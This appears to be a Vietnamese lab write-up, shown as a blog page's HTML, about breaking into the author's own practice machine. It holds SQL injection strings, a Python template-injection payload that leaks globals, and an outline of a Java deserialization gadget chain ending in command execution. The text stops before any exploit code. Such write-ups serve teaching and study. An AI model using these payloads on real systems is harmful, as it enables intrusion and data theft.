@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape) - quactv</title><meta name="Description" content="quactv blog"><meta property="og:title" content="[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)" />
+<meta property="og:description" content="Summary  Overview Rabbit hole Foothold with Java deserialization  Recon Exploit   Datmom to root with Python escape sandbox  Overview Địa chỉ: 10.14.140.127
+Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và phát triển bản thân.
+ 1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom 2 – Từ datmom escape python sandbox để leo thang lên root." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/write-up/mylab1/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="write-up" />
+<meta property="article:published_time" content="2022-02-24T18:17:00&#43;07:00" />
+<meta property="article:modified_time" content="2022-02-24T18:17:00&#43;07:00" /><meta property="og:site_name" content="quactv blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)"/>
+<meta name="twitter:description" content="Summary  Overview Rabbit hole Foothold with Java deserialization  Recon Exploit   Datmom to root with Python escape sandbox  Overview Địa chỉ: 10.14.140.127
+Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và phát triển bản thân.
+ 1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom 2 – Từ datmom escape python sandbox để leo thang lên root."/>
+<meta name="application-name" content="quactv blog">
+<meta name="apple-mobile-web-app-title" content="quactv blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/write-up/mylab1/" /><link rel="prev" href="http://example.org/write-up/vulnstack1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/write-up\/mylab1\/"
+        },"genre": "write-up","keywords": "Java, Privilege Escalation, Python","wordcount":  1700 ,
+        "url": "http:\/\/example.org\/write-up\/mylab1\/","datePublished": "2022-02-24T18:17:00+07:00","dateModified": "2022-02-24T18:17:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "quactv"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="quactv">&gt; root@quactv:~#</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/write-up/"> Write-up </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About me </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="quactv">&gt; root@quactv:~#</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/write-up/" title="">Write-up</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)</h1><div class="content" id="content"><h3 id="summary">Summary</h3>
+<ul>
+<li><a href="#overview" rel="">Overview</a></li>
+<li><a href="#rabbit-hole" rel="">Rabbit hole</a></li>
+<li><a href="#foothold-with-java-deserialization" rel="">Foothold with Java deserialization</a>
+<ul>
+<li><a href="#recon" rel="">Recon</a></li>
+<li><a href="#exploit" rel="">Exploit</a></li>
+</ul>
+</li>
+<li><a href="#datmom-to-root-with-python-escape-sandbox" rel="">Datmom to root with Python escape sandbox</a></li>
+</ul>
+<h3 id="overview">Overview</h3>
+<p>Địa chỉ: 10.14.140.127<br>
+Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và  phát triển bản thân.</p>
+<ul>
+<li>1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom</li>
+<li>2 – Từ datmom escape python sandbox để leo thang lên root.</li>
+</ul>
+<p>Ngoài ra còn 1 số dịch vụ khác đóng vai trò làm rabbit hole (SQLInjection, SSTI).</p>
+<h3 id="rabbit-hole">Rabbit hole</h3>
+<p>Sử dụng nmap scan nhanh ta thấy được các port dịch vụ đang open trên máy chủ:
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/1.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/1.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/1.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/1.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/1.jpg"
+        title="image" /></p>
+<p><strong>Port 80</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/2.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/2.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/2.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/2.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/2.jpg"
+        title="image" /></p>
+<p>Một ứng dụng web đang chạy trên port 80 cho phép chúng ta tìm kiếm thông tin nhân viên của CMC Infosec dựa vào user id do người dùng nhập vào:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/3.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/3.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/3.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/3.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/3.jpg"
+        title="image" /></p>
+<p>Ta dễ dang detect được trang web bị ảnh hưởng bởi lỗ hổng SQL Injection chỉ với việc chèn thêm dấu nháy (') để phá vỡ câu truy vấn SQL:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/4.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/4.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/4.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/4.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/4.jpg"
+        title="image" /></p>
+<p>Vì đây là chức năng tìm kiếm thông tin user dựa vào user id người dùng nhập vào. Nên ta có thể suy luận câu truy vấn SQL có thể như sau:<br>
+<code>SELECT id, full_name FROM users WHERE id LIKE '$id'</code></p>
+<p>Tiến hành dump all user ( <code>' or 1=1 -- -</code> ):</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/5.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/5.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/5.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/5.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/5.jpg"
+        title="image" /></p>
+<p>Sử dụng Sqlmap để dump all DB:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/6.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/6.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/6.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/6.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/6.jpg"
+        title="image" /></p>
+<p>Dump DB cmc_db:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/7.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/7.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/7.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/7.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/7.jpg"
+        title="image" /></p>
+<p>Dump DB secret:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/8.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/8.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/8.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/8.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/8.jpg"
+        title="image" /></p>
+<p>Không có nội dung đặc biệt và có thể lợi dụng được từ DB</p>
+<p>Trích xuất version hệ quản trị CSDL: <code>1' union select null,@@version -- -</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/9.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/9.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/9.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/9.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/9.jpg"
+        title="image" /></p>
+<p>Không thể sử dụng union kết hợp into outfile để get shell vì webroot đã được custom và user cũng không có quyền ghi vào thư mục webroot.</p>
+<p><strong>Port 9090</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/10.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/10.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/10.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/10.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/10.jpg"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/11.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/11.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/11.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/11.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/11.jpg"
+        title="image" /></p>
+<p>Check source code ta biết được dịch vụ đang chạy trên port này là cockpit.</p>
+<p><a href="https://github.com/cockpit-project/cockpit">https://github.com/cockpit-project/cockpit</a></p>
+<p>Chỉ là 1 GUI management giúp quản lý OS -&gt; Không có khả năng khai thác</p>
+<p><strong>Port 9988</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/12.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/12.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/12.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/12.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/12.jpg"
+        title="image" /></p>
+<p>Đây là 1 service tự custom là CMC memcat. Source code được cung cấp trước có sẵn tại:</p>
+<p>http://10.14.140.127/memcat_server.py</p>
+<p>Ta thấy service hoạt động như một STACK cho phép PUSH, POP và DELETE data.</p>
+<p>Hiển thị dữ liệu cho người dùng sử dụng <strong>.format</strong> (là một template có sẵn của Python)</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/13.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/13.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/13.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/13.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/13.jpg"
+        title="image" /></p>
+<p>Vì vậy ở đây có thể bị ảnh hưởng bởi lỗ hổng SSTI (Server Side Template Injection). Có thể khai thác khi chúng ta kiểm soát được khung của đầu ra dữ liệu.</p>
+<p>Ta thấy ở đây hầu hết các output đều được fix cứng và không thể khai thác:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/14.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/14.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/14.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/14.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/14.jpg"
+        title="image" /></p>
+<p>Xem kĩ tính năng DELETE với len(parsed_data) là 3 ta thấy:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/15.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/15.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/15.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/15.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/15.jpg"
+        title="image" /></p>
+<p>Ở đây ta có thể kiểm soát được <code>{val.value}</code> là giá trị ta PUSH vào từ trước. Khi len(parsed_data) là 3 service sẽ in ra giá trị đó cho biết chi tiết của key cần delete:</p>
+<p>Payload: <code>{val.__init__.__globals__}</code> (show ra toàn bộ biến global)</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/16.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/16.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/16.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/16.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/16.jpg"
+        title="image" /></p>
+<p>Chúng ta có hint: &ldquo;Thank for your efforts!\nPort 8081 is the only way!\n&rdquo;</p>
+<p>Thực tế chúng ta cũng không thể khai thác để chạy một lệnh tuỳ ý trên server vì .format trong python không cho phép gọi đến hàm, function khác.</p>
+<h3 id="foothold-with-java-deserialization">Foothold with Java deserialization</h3>
+<h4 id="recon">Recon</h4>
+<p>Khi truy cập vào máy chủ trên port 8081. Mặc định server cho ta download 1 file:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/17.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/17.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/17.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/17.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/17.jpg"
+        title="image" /></p>
+<p>Với nội dung:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/18.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/18.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/18.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/18.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/18.jpg"
+        title="image" /></p>
+<p>Dựa vào header Content-Disposition ta có thể thấy được tên file là đường dẫn file: <code>logs/info/info.2021-08-22.log</code></p>
+<p>Server trả về lỗi logname:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/19.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/19.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/19.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/19.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/19.jpg"
+        title="image" /></p>
+<p>Lúc này ta có thể thử thay đổi logname:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/20.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/20.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/20.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/20.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/20.jpg"
+        title="image" /></p>
+<p>Việc đổi logname vẫn trả về lỗi, nhưng có thể thấy rằng tên file đã thay đổi thực sự là tên file log, vì vậy nó có thể được chia theo ngày -&gt; ta thay thế thành năm, tháng và ngày hôm nay.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/21.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/21.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/21.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/21.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/21.jpg"
+        title="image" /></p>
+<p>Ta thấy file log được đọc thành công .Theo nội dung của file, có thể thấy rằng web sử dụng springboot, và tên gói jar tương ứng là <strong>cb-0.0.1- SNAPSHOT.jar</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/22.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/22.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/22.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/22.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/22.jpg"
+        title="image" /></p>
+<p>Thử tải xuống jar file:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/23.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/23.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/23.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/23.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/23.jpg"
+        title="image" /></p>
+<p>Thành công tải về jar file -&gt; Decompile để xem source</p>
+<p>Ở đây sử dụng JadX</p>
+<p>Xử lý chính:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/24.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/24.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/24.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/24.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/24.jpg"
+        title="image" /></p>
+<p>Ở đây ta tìm thấy được 1 API ẩn cho phép deserialize User từ request do người dùng gửi lên được mã hoá base64 sử dụng hàm <strong>readObject()</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/25.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/25.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/25.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/25.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/25.jpg"
+        title="image" /></p>
+<p>API endpoint:  <strong>/bZdWASYu4nN3obRiLpqKCeS8erTZrdxx/parseUser</strong></p>
+<p>Điều này cho phép chúng ta tận dụng để có thể khai khác lỗ hổng Java Deserialization</p>
+<h4 id="exploit">Exploit</h4>
+<p>File <strong>pom.xml</strong> là nơi khai báo tất cả những gì liên quan đến dự án được cấu hình qua maven, như khai báo các dependency, version của dự án, tên dự án, repossitory …</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/26.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/26.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/26.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/26.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/26.jpg"
+        title="image" /></p>
+<p>Từ pom.xml ta biết được project sử dụng thư viện <strong>commons-beanutils 1.8.2</strong></p>
+<p>Đây là 1  thư viện chứa một gadget chain có thể dẫn tới thực thi mã tuỳ ý trên máy chủ thông qua lỗ hổng Java Deserialization đã được phát hiện từ trước.</p>
+<p>Ysoserial là bột cộ công cụ nổi tiếng cho phép chúng ta gen payload Java Deserialization một cách tự động.</p>
+<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/27.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/27.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/27.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/27.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/27.jpg"
+        title="image" /></p>
+<p>Ở đây Ysoserial bao gồm cả payload liên quan đến thư viện commons-beanutils. Nhưng khi xem kĩ hơn phần code được sử dụng để gen payload cho thư viện này của ysoserial ta thấy:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/28.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/28.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/28.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/28.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/28.jpg"
+        title="image" /></p>
+<p>Ngoài việc sử dụng commons-beanutils, payload ysoserial tạo ra cũng cần <strong>commons-collections</strong> và <strong>commons-logging</strong> để có thể hoàn thiện chain. Mà trong dự án lại không có thêm 2 gói phụ thuộc này.</p>
+<p>Vậy chúng ta không thể sử dụng công cụ này để tạo payload giúp RCE máy chủ. Chúng ta chỉ có thể tự viết code gen payload chỉ bao gồm commons-beanutils và các thư viện chuẩn của java để tạo payload giúp RCE máy chủ.</p>
+<p>Như đã được phân tích kĩ trong bài viết : <a href="https://tranquac.com/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/">https://tranquac.com/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/</a></p>
+<p>Gadget chain có trong thư viện này sẽ như sau:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
+    <span class="n">PriorityQueue</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
+        <span class="n">PriorityQueue</span><span class="o">.</span><span class="na">heapify</span><span class="o">()</span>
+            <span class="n">PriorityQueue</span><span class="o">.</span><span class="na">siftDown</span><span class="o">()</span>
+                <span class="n">siftDownUsingComparator</span><span class="o">()</span>
+                    <span class="n">BeanComparator</span><span class="o">.</span><span class="na">compare</span><span class="o">()</span>
+                        <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">()</span>
+                            <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">()</span>
+                                <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getTransletInstance</span><span class="o">()</span>
+                                    <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">defineTransletClasses</span><span class="o">()</span>
+                                        <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">TransletClassLoader</span><span class="o">.</span><span class="na">defineClass</span><span class="o">()</span>
+                                            <span class="n">Pwner</span><span class="o">*(</span><span class="n">Javassist</span><span class="o">-</span><span class="n">generated</span><span class="o">).&lt;</span><span class="kd">static</span> <span class="n">init</span><span class="o">&gt;</span>
+                                                <span class="n">Runtime</span><span class="o">.</span><span class="na">exec</span><span class="o">()</span>
+</code></pre></div><p>Như đã được phân tích trong bài viết:</p>
